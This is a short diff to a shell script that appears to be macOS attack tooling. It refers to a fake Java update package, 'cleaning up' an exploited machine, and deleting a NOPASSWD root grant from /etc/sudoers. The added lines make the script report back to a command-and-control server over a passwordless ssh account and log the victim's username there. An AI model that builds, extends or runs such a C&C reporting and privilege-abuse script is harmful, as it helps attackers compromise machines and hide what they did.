@@ -59,6 +59,12 @@ curledFile=/tmp$$/Java_8_Update_60.pkg
     echo -e "\033[1mCleaning up exploited machine...\033[0m"
 
     echo;echo
+    
+#--- REPORT ---#
+echo -e "\033[1mSending back to C&C...\033[0m"
+ssh sshuser@<ServerAdress>  #We need to make an account that has no password so we don't need to make an expect script
+whoami >> /webserver/C&C.txt  #We need to add this too the server
+echo -e "\033[1mDone.\033[0m"
 
 #--- REMOVE THE LINE GRANTING ROOT ACCESS ---#
     sudo sed -i "" "/NOPASSWD:ALL/d" /etc/sudoers
